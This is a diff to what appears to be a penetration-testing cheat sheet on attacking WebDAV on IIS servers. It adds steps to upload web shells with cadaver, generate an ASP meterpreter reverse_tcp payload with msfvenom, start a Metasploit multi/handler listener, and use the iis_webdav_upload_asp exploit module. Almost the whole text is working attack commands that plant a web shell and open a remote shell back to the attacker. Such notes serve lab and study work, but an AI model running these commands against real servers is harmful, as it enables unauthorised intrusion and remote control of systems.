@@ -28,9 +28,14 @@ Web shells located -- /usr/share/webshells
 ```put /usr/share/webshells/(file type)/webshell.(filetype)```  
 
 # Metasploit  
+**Manual**  
 Generating an asp payload  
 ```msfvenom -p windows/meterpreter/reverse_tcp LHOST=(Local IP address) LPORT=1234 -f asp > shell.asp```  
-Upload shell using cadaver (previous 2 steps)  
-### Setup a listener  
+Upload shell using cadaver (previous 2 steps)   
 Start postgresql services - ```services postgresql start && msfconsole```  
-Use multi/handler  - ```set payload/windows/meterpreter/reverse_tcp```
+Use multi/handler  - ```set payload/windows/meterpreter/reverse_tcp```  
+
+**Automated**  
+Module - exploit/windows/iis/iis_webdav_upload_asp  
+set path - /webdav  ```set path /webdav/metasploit.asp```  
+
